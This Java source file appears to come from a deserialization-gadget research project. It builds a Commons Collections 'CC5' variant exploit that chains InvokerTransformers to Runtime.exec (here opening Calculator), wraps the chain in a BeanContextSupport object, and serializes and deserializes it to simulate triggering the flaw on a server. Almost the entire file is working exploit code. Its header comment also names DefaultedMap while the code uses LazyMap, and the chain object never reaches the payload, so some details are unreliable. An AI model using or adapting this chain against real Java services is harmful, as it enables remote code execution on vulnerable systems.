package com.sec.exploits.CommonsCollections.CommonsCollections5.NEW;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.beans.beancontext.BeanContextSupport;
import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

/**
 * @program: Gadgets
 * @description:
 * @author: 0range
 * @create: 2021-08-22 16:49
 **/


/**
 * <java.lang.reflect.Method: java.lang.Object invoke(java.lang.Object,java.lang.Object[])>
 *  <- <org.apache.commons.collections.functors.InvokerTransformer: java.lang.Object transform(java.lang.Object)> alias <- <org.apache.commons.collections.Transformer: java.lang.Object transform(java.lang.Object)>
 *  <- <org.apache.commons.collections.map.DefaultedMap: java.lang.Object get(java.lang.Object)> alias <- <java.util.Map: java.lang.Object get(java.lang.Object)>
 *  <- <org.apache.commons.collections.keyvalue.TiedMapEntry: java.lang.Object getValue()>
 *  <- <org.apache.commons.collections.keyvalue.TiedMapEntry: boolean equals(java.lang.Object)> alias <- <java.lang.Object: boolean equals(java.lang.Object)>
 *  <- <java.beans.beancontext.BeanContextSupport: void readObject(java.io.ObjectInputStream)>
 */

public class Three {
    public static void main(String[] args) throws Exception{
        Transformer[] transformers_exec = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class, Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"open /Applications/Calculator.app"})
        };

        Transformer chain = new ChainedTransformer(transformers_exec);

        HashMap innerMap = new HashMap();

        Map lazyMap = LazyMap.decorate(innerMap,chain);
        TiedMapEntry tmap = new TiedMapEntry(lazyMap, 123);
//        BadAttributeValueExpException payload = new BadAttributeValueExpException(null);
//        Field val = BadAttributeValueExpException.class.getDeclaredField("val");
//        val.setAccessible(true);
//        val.set(payload,tmap);

        BeanContextSupport payload = new BeanContextSupport();
        Field serializable = BeanContextSupport.class.getDeclaredField("serializable");
        serializable.setAccessible(true);
        serializable.set(payload,0);


        //payload序列化写入文件，模拟网络传输
        ObjectOutputStream fout = new ObjectOutputStream(new FileOutputStream(new File(System.getProperty("user.dir")+"/src/main/resources/Payload_cc5_Three.ser")));
        fout.writeObject(payload);

        //服务端读取文件，反序列化，模拟网络传输
        ObjectInputStream fin = new ObjectInputStream(new FileInputStream(new File(System.getProperty("user.dir")+"/src/main/resources/Payload_cc5_Three.ser")));
        //服务端反序列化，触发漏洞
        fin.readObject();
    }
}
